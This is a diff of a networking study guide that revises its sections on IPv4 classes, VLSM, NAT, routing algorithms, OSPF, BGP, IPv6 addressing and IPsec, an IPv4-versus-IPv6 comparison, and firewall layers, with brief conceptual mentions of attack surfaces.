 **IPv4 Address Classes Summary Table:**
 
-| Class | Leading bits | Size of *network* number bit field | Size of *rest* bit field | Number of networks | Addresses per network | Start address | End address |
-|-------|--------------|-----------------------------------|-------------------------|-------------------|----------------------|---------------|-------------|
-| Class A | 0 | 8 | 24 | 126 (2⁷ − 2) | 16,777,216 (2²⁴) | 0.0.0.0 | 127.255.255.255 |
-| Class B | 10 | 16 | 16 | 16,384 (2¹⁴) | 65,536 (2¹⁶) | 128.0.0.0 | 191.255.255.255 |
-| Class C | 110 | 24 | 8 | 2,097,152 (2²¹) | 256 (2⁸) | 192.0.0.0 | 223.255.255.255 |
+| Class | Leading bits | Size of *network* number bit field | Size of *rest* bit field | Number of networks | Total addresses per network | Usable hosts per network | Start address | End address |
+|-------|--------------|-----------------------------------|-------------------------|-------------------|-----------------------------|-------------------------|---------------|-------------|
+| Class A | 0 | 8 | 24 | 126 (2⁷ − 2) | 16,777,216 (2²⁴) | 16,777,214 (2²⁴ − 2) | 0.0.0.0 | 127.255.255.255 |
+| Class B | 10 | 16 | 16 | 16,384 (2¹⁴) | 65,536 (2¹⁶) | 65,534 (2¹⁶ − 2) | 128.0.0.0 | 191.255.255.255 |
+| Class C | 110 | 24 | 8 | 2,097,152 (2²¹) | 256 (2⁸) | 254 (2⁸ − 2) | 192.0.0.0 | 223.255.255.255 |
 | Class D (multicast) | 1110 | not defined | not defined | not defined | not defined | 224.0.0.0 | 239.255.255.255 |
 | Class E (reserved) | 1111 | not defined | not defined | not defined | not defined | 240.0.0.0 | 255.255.255.255 |
+
+> ⚠️ **Historical context only:** Classful addressing was deprecated in 1993 when CIDR (RFC 1519) was introduced. Modern IP allocation uses CIDR notation of any prefix length — there are no "Class A, B, or C" blocks in operational use today. These classes appear here for certification reference only.
 
 
 ### 13.4 IPv4 Header Fields Explained
@@ -6745,36 +6683,6 @@ If a datagram is too large for the next network’s MTU, it’s split into fragm
 - Use **different subnet masks** within the same network.
 - Allocate largest needs first, then split the remaining space.
 
-**VLSM Step‑by‑Step Example**
-
-**Root Network:** 200.1.2.0/24
-
-**Requirements:**
-- Network A: 120 hosts
-- Network B: 60 hosts
-- Network C: 60 hosts
-
-**Step 1: Allocate A (Largest First)**
-- Need 120 → closest power of 2 = 128 → **/25**
-- Assign: **200.1.2.0/25** (range .0 – .127)
-
-**Step 2: Allocate B (Next Largest)**
-- Remaining block: 200.1.2.128/25
-- Need 60 → closest power of 2 = 64 → **/26**
-- Assign: **200.1.2.128/26** (range .128 – .191)
-
-**Step 3: Allocate C**
-- Remaining block: 200.1.2.192/26
-- Assign: **200.1.2.192/26** (range .192 – .255)
-
-**Final Network Map**
-
-| Network | Requirement | Allocated Range | Subnet Mask | Prefix |
-| --- | --- | --- | --- | --- |
-| Net A | 120 hosts | 200.1.2.0 – 200.1.2.127 | 255.255.255.128 | /25 |
-| Net B | 60 hosts | 200.1.2.128 – 200.1.2.191 | 255.255.255.192 | /26 |
-| Net C | 60 hosts | 200.1.2.192 – 200.1.2.255 | 255.255.255.192 | /26 |
-
 **Benefits of VLSM**
 - **Optimized allocation:** Minimal wastage of IPs.
 - **Route summarization:** Contiguous blocks can be summarized.
@@ -6896,7 +6804,7 @@ If a datagram is too large for the next network’s MTU, it’s split into fragm
 
 **Benefits:**
 - **Address Conservation:** Extends IPv4 lifespan
-- **Security:** Hides internal IP addresses
+- **Address obscurity:** Hides internal IP structure from external observers — this is NOT a security control and does not replace firewalling or segmentation. NAT does not filter packets, authenticate connections, or prevent outbound malware C2 communication.
 - **Flexibility:** Internal network changes don't affect external connectivity
 
 **Drawbacks:**
@@ -6990,10 +6898,10 @@ Note: NAT is commonly used to extend IPv4 address utility in private networks.
 
 #### Distance Vector Routing (DVR)
 
+> **Algorithm vs Protocol:** DVR is a routing *algorithm* (Bellman-Ford), not a wire protocol. It has no header of its own. Header sizes belong to specific protocols that *implement* DVR — see RIP below for protocol-level details.
+
 **Introduction**
 - A **dynamic routing algorithm** based on **Bellman‑Ford**.
-
-> **Note:** DVR is an algorithm/concept, not a protocol with a header. The header size shown in some texts refers to RIP (one DVR implementation) whose wire header is 4 bytes + 20 bytes per route entry. Do not conflate the algorithm with any one protocol.
 - Routers discover best paths without manual configuration.
 
 **Three Golden Rules**
@@ -7023,10 +6931,9 @@ $$
 
 ---
 
-
 #### Link State Routing (LSR)
 
-**Header Size:** OSPF LSA header is 20 bytes; OSPF packet header is 24 bytes
+> **Algorithm vs Protocol:** LSR is a routing *algorithm* (Dijkstra/SPF), not a wire protocol. It has no header of its own. Header sizes belong to OSPF (which implements LSR) — see the OSPF section below.
 
 **Core Idea: Global Knowledge**
 - Each router builds a **complete map** of the network.
@@ -7052,10 +6959,9 @@ $$
 
 ---
 
-
 #### Path Vector Routing (PVR)
 
-**Header Size:** BGP UPDATE message header is 19 bytes; total BGP header is 19 bytes
+> **Algorithm vs Protocol:** PVR is a routing *algorithm* (AS-path-based policy routing), not a wire protocol. It has no header of its own. Header sizes belong to BGP (which implements PVR) — see the BGP section below.
 
 **Where it’s used**
 - **Inter‑domain routing** (between ISPs/AS) — foundation of **BGP**.
@@ -7072,10 +6978,9 @@ $$
 
 ---
 
-
 #### Hierarchical Routing & Autonomous Systems
 
-**Header Size:** Depends on protocol (e.g., OSPF, BGP, RIP); no fixed header size for hierarchy itself
+> **Architectural concept:** Hierarchical Routing is a network *design principle*, not a protocol. It has no header. The protocols that operate within this hierarchy (OSPF, BGP, RIP) have their own headers, covered in their respective sections.
 
 **Why Hierarchical Routing?**
 - The Internet is too large for flat routing tables.
@@ -7166,6 +7071,7 @@ $$
   $$
 \mathrm{Cost} = \frac{\mathrm{Reference\ Bandwidth}}{\mathrm{Interface\ Bandwidth}}
   $$
+  > **Important:** The default reference bandwidth is 100 Mbps (Cisco IOS default). This means FastEthernet (100 Mbps) and GigabitEthernet both calculate to cost ≤ 1 — OSPF uses integers, so both get cost 1, making OSPF unable to prefer GigE over FastEthernet. Always set `auto-cost reference-bandwidth 10000` (or higher than your fastest link) to avoid incorrect path selection.
 - **Protocol ID:** 89 (runs directly over IP)
 - **Administrative Distance (AD):** 110 (Cisco default)
 
@@ -7175,7 +7081,7 @@ $$
 - **LSDB:** Shared topology database per area
 - **LSA:** Link State Advertisement (topology info)
 - **Areas:** Hierarchical design; all areas connect to **Area 0**
-- **DR/BDR:** Designated/Backup router on multi‑access networks
+- **DR/BDR:** Designated/Backup router on multi‑access networks. On Ethernet broadcast segments, without DR/BDR every OSPF router would need a full mesh of adjacencies — N(N-1)/2 for N routers. DR/BDR reduces this to O(N): all routers form adjacencies only with the DR and BDR. Election uses router priority (default 1; higher wins) with Router ID as tiebreaker. Only the DR generates LSAs on behalf of the segment.
 
 **OSPF Packet Types**
 - **Hello:** Neighbor discovery/keep‑alive
@@ -7208,7 +7114,7 @@ $$
 
 **What is BGP?**
 - **EGP (Inter‑Domain)** routing protocol connecting **Autonomous Systems**.
-- Internet’s de‑facto exterior routing protocol. **BGP‑1** was defined in RFC 1105 (1989); **BGP‑4** (current version, with CIDR support) was standardized in RFC 1771 (1995), later updated by RFC 4271 (2006). When people say “BGP,” they mean BGP-4.
+- Internet's de‑facto exterior routing protocol. BGP-4 was first standardized in RFC 1771 (1995). The **current specification is RFC 4271 (January 2006)**, which obsoleted RFC 1771. BGP‑1 was first defined in 1989 (RFC 1105).
 
 **Characteristics**
 - **Algorithm:** Path Vector
@@ -7288,7 +7194,7 @@ $$
 ## 14. IPv6 — Next Generation IP
 
 **Section Overview:**
-IPv6 solves IPv4's address exhaustion with 128-bit addresses (2^128 unique addresses—enough for trillions of devices) and simplifies header processing. While IPv4 dominates (99%+ of internet traffic), IPv6 is growing rapidly—and it's often **poorly monitored and poorly understood as an attack surface**. For attackers, IPv6 on dual-stack networks is an underexplored attack vector. For defenders, IPv6 requires new monitoring and segmentation strategies. Understanding IPv6 is increasingly critical as deployment accelerates globally.
+IPv6 solves IPv4's address exhaustion with 128-bit addresses (2^128 unique addresses—enough for trillions of devices) and simplifies header processing. While IPv4 still carries the majority of internet traffic, IPv6 has reached ~40% adoption globally (as of 2026) and is growing rapidly—and it's often **poorly monitored and poorly understood as an attack surface**. For attackers, IPv6 on dual-stack networks is an underexplored attack vector. For defenders, IPv6 requires new monitoring and segmentation strategies. Understanding IPv6 is increasingly critical as deployment accelerates globally.
 
 **Learning Outcomes:**
 After this section, you'll understand:
@@ -7320,8 +7226,7 @@ After this section, you'll understand:
 ### 14.2 IPv6 Address Structure
 
 **Address Size:** 128-bit → 2¹²⁸ = 340,282,366,920,938,463,463,374,607,431,768,211,456 addresses
-- 340 undecillion addresses
-- **~665 quadrillion addresses per square millimeter** of Earth's surface!
+- 340 undecillion addresses — deliberately large to support hierarchical routing allocation, /64 subnets per link (required for SLAAC), and elimination of NAT to restore end-to-end connectivity that IPv4 lost due to exhaustion.
 
 **Representation:** Eight groups of four hexadecimal digits, separated by colons
 
@@ -7397,7 +7302,7 @@ Step 3: 2001:0db8:0000:0000:0000:0000:0000:0001
 **Types of Unicast:**
 - **Global Unicast (2000::/3):** Internet-routable addresses (like public IPv4)
 - **Link-Local (fe80::/10):** Only valid on local link, not routed (like 169.254.x.x in IPv4)
-- **Unique Local (fd00::/8 in practice, block fc00::/7):** Private addresses, not routed on Internet (like RFC 1918 in IPv4). In practice only fd00::/8 (L-bit=1) is used; fc00::/8 is reserved and unallocated per RFC 4193
+- **Unique Local (fc00::/7):** Private addresses, not routed on Internet (like RFC 1918 in IPv4)
 - **Loopback (::1/128):** Local machine (like 127.0.0.1 in IPv4)
 - **Unspecified (::/128):** No address assigned
 
@@ -7430,10 +7335,12 @@ Step 3: 2001:0db8:0000:0000:0000:0000:0000:0001
 - **EUI-64:** Often derived from MAC address
 
 **Unique Local (fd00::/8 in practice):**
-- Private addresses for internal networks, not routed on global Internet
-- Replacement for IPv4 private addresses
-- RFC 4193 defines the fc00::/7 block; the L-bit distinguishes halves: fc00::/8 (L=0) is reserved/unallocated; fd00::/8 (L=1) is the only deployed range
-- Always generate a random 40-bit Global ID within fd00::/8 to avoid collisions
+- Private addresses for internal networks (like RFC 1918 in IPv4)
+- Not routed on global Internet
+- RFC 4193 defines the full `fc00::/7` block, but the two halves have different meanings:
+  - **fc00::/8** (L-bit = 0): Not yet assigned — has no defined purpose; do not assign addresses from this range until standardized
+  - **fd00::/8** (L-bit = 1): Locally assigned — **this is what you use in practice**
+- Generate a random /48 within fd00::/8 for each site to avoid collisions
 
 **Global Unicast (2000::/3):**
 - Publicly routable on Internet
@@ -7638,9 +7545,8 @@ or
 - Smaller routing tables
 - Route aggregation
 
-✅ **Built-in Security:**
-- IPsec support was designed into the protocol architecture from the start
-- In practice, IPsec is **not enabled by default** and is not mandatory. RFC 8200 (current IPv6 standard) recommends IPsec support but does not mandate it. IPv6 traffic is unencrypted by default — IPsec must be explicitly configured, exactly as with IPv4.
+✅ **IPsec Architecture:**
+- IPsec support was designed into the protocol architecture from the start — however, IPsec is **not enabled by default** in IPv6 (RFC 8200). IPv6 connections are unencrypted by default, exactly like IPv4. This is an architectural design inclusion, not an operational security guarantee. IPsec must be explicitly configured on both endpoints.
 
 ✅ **Autoconfiguration:**
 - SLAAC - no DHCP server needed
@@ -8056,253 +7962,91 @@ fd00::1                           - Unique local
 
 ---
 
-## 15. IPv4 vs IPv6 — Detailed Comparison
+## 15. IPv4 vs IPv6 — Quick Reference Comparison
 
-**Section Overview:**
-This section directly compares IPv4 and IPv6 across 11+ dimensions: addressing, headers, configuration, security, and deployment timelines. Understanding the trade-offs helps you anticipate which protocol might be used in target networks and what attack surfaces each presents. Many organizations run "dual-stack" networks (both IPv4 and IPv6 simultaneously)—understanding the coexistence mechanisms and potential bypasses is critical for both penetration testing and defense. IPv4-only thinking will miss real attack paths in modern networks.
-
-**Learning Outcomes:**
-After this section, you'll understand:
-- ✓ Head-to-head comparison of IPv4 and IPv6 across 11+ dimensions
-- ✓ Address space, header efficiency, configuration methods
-- ✓ NAT in IPv4 vs native IPv6 (no NAT) and security implications
-- ✓ Security differences: mandatory IPsec theory vs optional implementation reality
-- ✓ Deployment status globally and adoption challenges
-- ✓ Transition mechanisms (dual-stack, tunneling, translation) and their security gaps
-- ✓ Penetration testing implications of dual-stack networks
-
-**Difficulty:** 🟡 Intermediate | **Prerequisites:** Sections 1-14
-
-### 15.1 Address Space and Notation
-
-| Feature | IPv4 | IPv6 |
-|---------|------|------|
-| **Address Size** | 32-bit | 128-bit |
-| **Address Space** | ~4.3 billion (2³²) | ~340 undecillion (2¹²⁸) |
-| **Notation** | Dotted-decimal (192.168.1.1) | Colon-hexadecimal (2001:db8::1) |
-| **Groups** | 4 octets of decimal (0-255) | 8 groups of hex (0000-ffff) |
-| **Shorthand** | None | Leading zero omission, :: for zeros |
-| **Address Classes** | A, B, C, D, E (classful) | No classes, hierarchical allocation |
-| **Private Addresses** | RFC 1918 (10/8, 172.16/12, 192.168/16) | Unique Local (fc00::/7, typically fd00::/8) |
-| **Loopback** | 127.0.0.1 | ::1 |
-| **Link-Local** | 169.254.0.0/16 (APIPA) | fe80::/10 (always present) |
-| **Broadcast** | 255.255.255.255 (and subnet broadcasts) | None (replaced by multicast) |
-| **Multicast Range** | 224.0.0.0/4 (Class D) | ff00::/8 (all ff addresses) |
-
-### 15.2 Header Structure Comparison
-
-| Header Feature | IPv4 | IPv6 |
-|----------------|------|------|
-| **Header Size** | Variable (20-60 bytes) | Fixed (40 bytes) |
-| **Header Fields** | 12+ fields | 8 fields |
-| **Options** | Variable-length options in header | Extension headers (chained after main) |
-| **Checksum** | Header checksum present | No checksum (faster processing) |
-| **Fragmentation** | Any router can fragment | Only source can fragment |
-| **Fragment Info** | In main header (Flags, Offset) | Separate Fragment extension header |
-| **TTL/Hop Limit** | TTL (Time To Live) | Hop Limit (same concept, clearer name) |
-| **Protocol/Next Header** | Protocol field (8-bit) | Next Header field (8-bit, also for extensions) |
-| **TOS/Traffic Class** | Type of Service (8-bit) | Traffic Class (8-bit, similar purpose) |
-| **Flow Identification** | None native | Flow Label (20-bit) for QoS |
-| **Header Extensibility** | Limited by options field | Flexible via extension headers |
-
-**Header Size Impact:**
-- **IPv4:** Variable header complicates parsing, requires checksum recalculation at each hop
-- **IPv6:** Fixed header enables faster forwarding, no checksum saves CPU cycles
-
-### 15.3 Configuration and Management
-
-| Aspect | IPv4 | IPv6 |
-|--------|------|------|
-| **Manual Config** | Supported | Supported |
-| **Automatic Config** | DHCP (Dynamic Host Configuration Protocol) | SLAAC (Stateless Address Autoconfiguration) + DHCPv6 |
-| **Address Assignment** | DHCP server required for auto | SLAAC works without server (uses router advertisements) |
-| **DNS Server Discovery** | Via DHCP | Via DHCP or Router Advertisement (RDNSS) |
-| **Address Conflicts** | DHCP handles via lease management | DAD (Duplicate Address Detection) via NDP |
-| **Renumbering** | Difficult, requires DHCP scope changes | Easier with SLAAC, multiple addresses per interface |
-| **Temporary Addresses** | Not standard | Privacy Extensions (RFC 4941) |
-
-**SLAAC Advantages:**
-- Zero-touch provisioning
-- No DHCP server dependency
-- Faster network access
-- Built-in privacy options
-
-### 15.4 Network Address Translation (NAT)
-
-| Aspect | IPv4 | IPv6 |
-|--------|------|------|
-| **NAT Necessity** | Required due to address shortage | Not needed (sufficient addresses) |
-| **NAT Usage** | Universal (home routers, enterprises) | Discouraged, but possible (NAT66) |
-| **End-to-End Connectivity** | Broken by NAT | Preserved (design goal) |
-| **Port Forwarding** | Required for hosting services | Not needed (every device globally addressable) |
-| **Impact on Protocols** | Breaks some P2P, VoIP, VPN | No NAT complications |
-| **Security Consideration** | NAT provides obscurity (not true security) | Firewall recommended (explicit policy) |
-
-**Architectural Philosophy:**
-- **IPv4:** NAT became necessity, accepted as "good enough"
-- **IPv6:** End-to-end principle restored, proper firewall security
-
-### 15.5 Protocol and Services
-
-| Service | IPv4 | IPv6 |
-|---------|------|------|
-| **Address Resolution** | ARP (Address Resolution Protocol) | NDP (Neighbor Discovery Protocol) |
-| **ICMP** | ICMPv4 | ICMPv6 (more functionality) |
-| **Router Discovery** | ICMP Router Discovery (rarely used) | NDP Router Advertisements (standard) |
-| **Path MTU Discovery** | Optional | Built-in via ICMPv6 |
-| **Multicast Listener** | IGMP (Internet Group Management Protocol) | MLD (Multicast Listener Discovery) |
-| **Fragmentation Handling** | Routers fragment as needed | Path MTU Discovery + source fragments |
-| **DNS Records** | A record (IPv4 address) | AAAA record (IPv6 address) |
-| **Reverse DNS** | in-addr.arpa | ip6.arpa |
-| **IPsec** | Optional, complex setup | Designed-in from start (now optional but common) |
-
-**NDP vs ARP:**
-- **NDP:** Uses ICMPv6, more secure (can use IPsec), handles router/prefix discovery, address autoconfiguration
-- **ARP:** Separate protocol, less secure, only address resolution
-
-### 15.6 Security Comparison
-
-| Security Aspect | IPv4 | IPv6 |
-|-----------------|------|------|
-| **IPsec Support** | Optional, bolt-on | Designed into the protocol architecture but not mandatory and not enabled by default. IPv6 traffic is unencrypted by default — same as IPv4. IPsec must be explicitly configured on both endpoints. (RFC 8200) |
-| **Address Scanning** | Feasible (scan /24 in seconds) | Impractical (2⁶⁴ addresses on subnet) |
-| **Privacy** | DHCP leases somewhat trackable | Privacy extensions randomize addresses |
-| **NAT "Security"** | Provides obscurity | No NAT, requires explicit firewall rules |
-| **Header Manipulation** | Easier due to variable length | Fixed header limits manipulation |
-| **Checksums** | Header checksum provides some integrity | No header checksum, rely on upper layers |
-| **NDP Security** | ARP poisoning common | SEND (Secure Neighbor Discovery) available |
-| **Extension Headers** | N/A | Potential attack vector, filtered by many firewalls |
-
-**Red Team Implications:**
-- **IPv4:** Network scanning practical, NAT complicates pivoting
-- **IPv6:** Scanning impractical (need alternative recon), end-to-end routing can help pivoting, but firewalls more critical
-
-### 15.7 Performance and Efficiency
-
-| Performance Aspect | IPv4 | IPv6 |
-|--------------------|------|------|
-| **Header Processing** | Variable length, checksum, fragmentation → slower | Fixed length, no checksum → faster |
-| **Routing Table Size** | Growing, fragmented | Hierarchical, more aggregatable |
-| **Checksum Overhead** | Router recalculates at each hop | No checksum, offload to transport layer |
-| **Fragmentation Overhead** | Any router can fragment, reassemble | End-to-end (PMTUD), reduces overhead |
-| **MTU Discovery** | Optional, often disabled | Standard part of operation |
-| **Broadcast Storms** | Possible | No broadcast, multicast scoped |
-| **Address Allocation** | Complex (CIDR, subnetting, conservation) | Simplified (/64 per subnet standard) |
-
-**Real-World Performance:**
-- Modern hardware: IPv6 often **as fast or faster** than IPv4
-- Legacy equipment: May process IPv6 slower (software vs hardware)
-- Dual-stack overhead: Running both protocols increases complexity
-
-### 15.8 Deployment and Transition
-
-| Deployment Aspect | IPv4 | IPv6 |
-|-------------------|------|------|
-| **Global Deployment** | Universal | ~40% of Internet traffic (2026) |
-| **Enterprise Adoption** | 100% | Gradual, varies by region |
-| **ISP Support** | Complete | Most major ISPs support |
-| **Mobile Networks** | Legacy | Primary protocol for many carriers |
-| **Operating System Support** | All systems | All modern systems (Windows, Linux, macOS, iOS, Android) |
-| **Application Support** | Universal | Most apps, but some legacy software IPv4-only |
-| **Transition Mechanism** | N/A (already deployed) | Dual-stack, tunneling (6in4, 6to4, Teredo), translation (NAT64/DNS64) |
-| **Backward Compatibility** | N/A | Not directly compatible (need translation/tunneling) |
-
-**Regional Variations:**
-- **High IPv6 Adoption:** India (~70%), Germany (~60%), USA (~50%)
-- **Lower Adoption:** Some developing regions, legacy enterprise networks
-- **Drivers:** Mobile networks, cloud providers, government mandates
-
-### 15.9 Address Management Comparison
-
-**IPv4 Address Management Challenges:**
-- Address exhaustion → hoarding, complex allocation
-- CIDR and VLSM to maximize efficiency
-- NAT required for most networks
-- Renumbering painful and disruptive
-- Address markets for buying/selling
-
-**IPv6 Address Management Advantages:**
-- Abundant addresses → /64 per subnet standard
-- Hierarchical allocation simplifies routing
-- Multiple addresses per interface (global, link-local, temporary)
-- Easier renumbering (multiple prefixes simultaneously)
-- No need for address conservation
-
-**Subnetting Philosophy:**
-- **IPv4:** Conserve, split carefully, calculate precisely
-- **IPv6:** Allocate generously, /48 per site, /64 per subnet standard
-
-### 15.10 Summary Table - When to Use Each
-
-| Scenario | IPv4 | IPv6 | Recommendation |
-|----------|------|------|----------------|
-| **New Network Deployment** | ❌ Legacy only | ✅ Primary | **Dual-stack** (both) |
-| **Internet-Facing Services** | ✅ Still required | ✅ Increasingly important | **Dual-stack** mandatory |
-| **Internal Enterprise Network** | ✅ Established | ⚠️ Transition ongoing | Move to **dual-stack** |
-| **Mobile/IoT Deployments** | ⚠️ Limited by NAT | ✅ Ideal | **IPv6-first** or IPv6-only |
-| **Legacy Application Support** | ✅ Required | ❌ May not support | **IPv4** with transition plan |
-| **High-Security Environment** | ✅ Well-understood | ✅ Modern features | **Both** with proper hardening |
-| **Future-Proofing** | ❌ Obsolescent | ✅ Future | **Invest in IPv6 training** |
-
-> [!TIP]
-> **Best Practice for New Deployments:**
-> 1. **Deploy dual-stack** (both IPv4 and IPv6)
-> 2. **Prefer IPv6** when both available (Happy Eyeballs algorithm)
-> 3. **Maintain IPv4** for legacy compatibility
-> 4. **Monitor IPv6 traffic** as percentage grows
-> 5. **Plan eventual IPv4 retirement** (years away for most)
-
-> [!WARNING]
-> **Common Migration Pitfalls:**
-> - Assuming IPv6 "just works" without testing
-> - Neglecting IPv6 firewall rules (many breaches due to unprotected IPv6)
-> - Using EUI-64 addresses (privacy concerns)
-> - Forgetting to update monitoring/logging for IPv6
-> - Misconfiguring dual-stack priority
-
-### 15.11 Quick Reference Cheat Sheet
-
-**Private IPv4 Ranges (RFC 1918):**
-- `10.0.0.0/8` → 10.0.0.0 - 10.255.255.255 (16.7M addresses)
-- `172.16.0.0/12` → 172.16.0.0 - 172.31.255.255 (1M addresses)
-- `192.168.0.0/16` → 192.168.0.0 - 192.168.255.255 (65K addresses)
-
-**IPv6 Unique Local:**
-- `fd00::/8` (the only deployed ULA range; `fc00::/8` is reserved and unallocated per RFC 4193)
-
-**Loopback Addresses:**
-- **IPv4:** 127.0.0.0/8 (entire range, 127.0.0.1 most common)
-- **IPv6:** ::1/128 (single address)
-
-**Link-Local Addresses:**
-- **IPv4:** 169.254.0.0/16 (APIPA - Automatic Private IP Addressing)
-- **IPv6:** fe80::/10 (always auto-configured)
-
-**Protocol Numbers (IP Header "Protocol" Field):**
-- **ICMP:** 1 (ICMPv4)
-- **TCP:** 6
-- **UDP:** 17
-- **ICMPv6:** 58
-- **OSPF:** 89
-- **GRE:** 47
+> **Note:** Detailed IPv4 coverage is in Section 13. Detailed IPv6 coverage is in Section 14. This section is a consolidated comparison reference — not a replacement for those sections.
 
 ---
 
-## 📚 PART V: SERVICES, SECURITY & APPLICATIONS (Sections 16-19)
+### 15.1 Address and Header Comparison
 
-**Difficulty Level:** 🟡 Intermediate | **Prerequisites:** Complete Parts I-IV
+| Feature | IPv4 | IPv6 |
+|---|---|---|
+| **Address size** | 32-bit | 128-bit |
+| **Address space** | ~4.3 billion (2³²) | ~340 undecillion (2¹²⁸) |
+| **Notation** | Dotted-decimal — `192.168.1.1` | Colon-hex — `2001:db8::1` |
+| **Private addresses** | RFC 1918 (10/8, 172.16/12, 192.168/16) | Unique Local — fd00::/8 (in practice) |
+| **Loopback** | 127.0.0.1 | ::1 |
+| **Link-local** | 169.254.0.0/16 (APIPA — assigned when DHCP fails) | fe80::/10 (always auto-configured) |
+| **Broadcast** | Yes (255.255.255.255 + subnet broadcast) | No — replaced by multicast |
+| **Multicast** | 224.0.0.0/4 (Class D) | ff00::/8 |
+| **Header size** | Variable 20–60 bytes | Fixed 40 bytes |
+| **Header checksum** | Yes — recalculated at every hop | No — offloaded to transport layer |
+| **Fragmentation** | Any router can fragment | Source only; routers send ICMPv6 Packet Too Big |
+| **Address resolution** | ARP | NDP (Neighbor Discovery Protocol) |
+| **Auto-configuration** | DHCP | SLAAC + DHCPv6 |
+| **IPsec** | Optional | Designed-in but not enabled by default (RFC 8200) — same as IPv4 in practice |
+| **NAT** | Universal (address scarcity) | Not needed; discouraged |
+| **DNS record** | A | AAAA |
+| **Reverse DNS zone** | in-addr.arpa | ip6.arpa |
+
+---
+
+### 15.2 Security and Operational Differences
+
+| Aspect | IPv4 | IPv6 |
+|---|---|---|
+| **Subnet scanning** | Practical — /24 = 254 hosts | Impractical — /64 = 2⁶⁴ addresses |
+| **NAT "security"** | Obscurity only — not a security control | No NAT; explicit firewall required |
+| **Privacy** | DHCP leases trackable | Privacy extensions (RFC 4941) randomize IIDs |
+| **Neighbor spoofing** | ARP poisoning (no authentication) | NDP spoofing; mitigated by RA Guard + DAI |
+| **Transition tunneling** | N/A | 6to4, Teredo, ISATAP — can bypass IPv4-only firewalls |
+| **Monitoring gap** | Well-monitored | Often under-monitored; dual-stack blind spots are common |
+| **Firewall requirement** | Yes | Yes — every IPv6-enabled host needs IPv6 firewall rules |
+
+---
+
+### 15.3 When to Use Each
+
+| Scenario | Recommendation |
+|---|---|
+| New network deployment | Dual-stack (IPv4 + IPv6) |
+| Internet-facing services | Dual-stack mandatory |
+| Internal enterprise | Move toward dual-stack |
+| Mobile / IoT | IPv6-first preferred |
+| Legacy application support | IPv4 with transition plan |
+| High-security environment | Both, with mirrored firewall rules |
+
+---
+
+### 15.4 Quick Reference — Special Addresses
+
+**IPv4 special ranges:**
+- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` — RFC 1918 private
+- `127.0.0.0/8` — loopback
+- `169.254.0.0/16` — APIPA/link-local
+- `224.0.0.0/4` — multicast
+- `255.255.255.255` — limited broadcast
+
+**IPv6 special addresses:**
+- `::1/128` — loopback
+- `fe80::/10` — link-local (always present)
+- `fd00::/8` — unique local (private, use in practice)
+- `ff00::/8` — multicast
+- `2000::/3` — global unicast (internet-routable)
+
+**Protocol numbers:**
+- ICMP = 1, TCP = 6, UDP = 17, ICMPv6 = 58, OSPF = 89, GRE = 47
 
 ---
 
 ### 🎯 Key Takeaways - Section 15
 
-**TL;DR:** IPv4 still dominates but IPv6 is growing fast (~40% of Internet traffic as of 2026 per Google). IPv4 uses NAT for address sharing; IPv6 has native global addressing. IPv4 header is 20-60 bytes (variable); IPv6 is fixed 40 bytes (simpler). IPv6 IPsec support was designed in from the start but is not mandatory and not enabled by default — IPv6 connections are unencrypted by default, exactly like IPv4. Transition mechanisms (dual-stack, tunneling) allow coexistence.
-
-- **IPv4 exhaustion = solved by NAT, not migration** — Expected 2011; still works in 2024 via NAT; slows IPv6 adoption
-- **IPv6 header is simpler than IPv4** — No fragmentation options (sent to source), no TTL interpretation differences, simpler parsing
-- **Dual-stack = pragmatic solution** — Run both IPv4 and IPv6 simultaneously; devices support both protocols
-- **IPv6 tunneling over IPv4 (6to4, Teredo) enables early IPv6** — Encapsulate IPv6 packets in IPv4; used in transition period
-- **IPv6 multicast replaces IPv4 broadcast** — No broadcast in IPv6; multicast (ff00::/8) used for efficient group communication
+- **IPv6 is not "more secure by default"** — IPsec is optional and not enabled; connections are unencrypted exactly like IPv4
+- **No NAT in IPv6 does not mean no security** — Every dual-stack host needs explicit IPv6 firewall rules
+- **Dual-stack = double attack surface** — IPv6 is enabled by default on all modern OSes; if the IPv4 path is monitored but IPv6 is not, attackers use IPv6
+- **Subnet scanning is impractical in IPv6** — But predictable addresses (EUI-64, low-value like ::1, ::2) and DNS still enable host discovery
+- **Transition mechanisms are bypass vectors** — 6to4, Teredo, ISATAP can carry IPv6 through IPv4-only firewalls if not explicitly blocked
 
 [↑ Back to top](#table-of-contents)
 
@@ -8334,12 +8078,7 @@ A penetration tester identifies target services running on discovered IP address
 
 ## 16. MIME Types — Multipurpose Internet Mail Extensions
 
-> [!WARNING]
-> **Placement note:** MIME is **NOT a networking protocol**. It is an application-layer content metadata standard used in HTTP and email. It does not belong in a networking fundamentals module by strict classification — it belongs in a Web Security module.
->
-> It is included here because: (1) it appears in HTTP responses at the application layer and understanding it is prerequisite to web attack surface analysis, and (2) file upload vulnerabilities (MIME bypass, polyglot files, XXE) are among the most common real-world attack vectors.
->
-> **Read this section when studying web application security.** If you are progressing linearly, you can skip to Section 17 (Firewalls) and return here when you start web security. This section is a standalone reference — skipping it does not break any later networking sections.
+> **Context note:** MIME is an application-layer concept — it describes content metadata attached to HTTP responses and email messages, not a networking protocol. It is covered here because it directly feeds into web attack surface understanding, but the full context for MIME (HTTP headers, file upload security, browser content sniffing) belongs to web security study. Read this section alongside your HTTP and web application security material.
 
 **Section Overview:**
 MIME types are metadata labels telling applications what kind of content they're receiving. This seems innocuous, but MIME handling is a critical security control — and it fails constantly. Mishandling MIME types enables file upload bypasses, XXE attacks, polyglot file exploits, and browser script execution. This section covers both offensive techniques (polyglot files) and defensive controls (MIME validation, Content-Disposition headers). If you understand MIME, you unlock an entire category of vulnerabilities.
@@ -8792,7 +8531,7 @@ DENY all
 - ❌ No application-layer inspection
 - ❌ Difficult to configure for complex protocols (FTP, SIP)
 
-**OSI Layers:** Network Layer (Layer 3) + Transport Layer (Layer 4) — packet filters inspect IP addresses at L3 *and* port numbers/TCP flags at L4; a pure L3-only filter would have no port awareness
+**OSI Layers:** Network Layer (Layer 3) + Transport Layer (Layer 4) — packet filters inspect IP addresses (L3) and port numbers/protocol/TCP flags (L4). A filter with no port awareness would only be an IP-level ACL; packet filters are always at minimum L3/L4.
 
 #### 17.2.2 Second Generation: Stateful Inspection Firewalls
 
@@ -8832,8 +8571,6 @@ SRC_IP         DST_IP        SRC_PORT  DST_PORT  STATE        PROTO
 - ❌ Vulnerable to state exhaustion attacks
 - ❌ UDP "state" is approximated (connectionless protocol)
 
-**OSI Layer:** Network Layer (Layer 3) + Transport Layer (Layer 4)
-
 **Common Implementations:** iptables (Linux), Windows Firewall, Cisco ASA
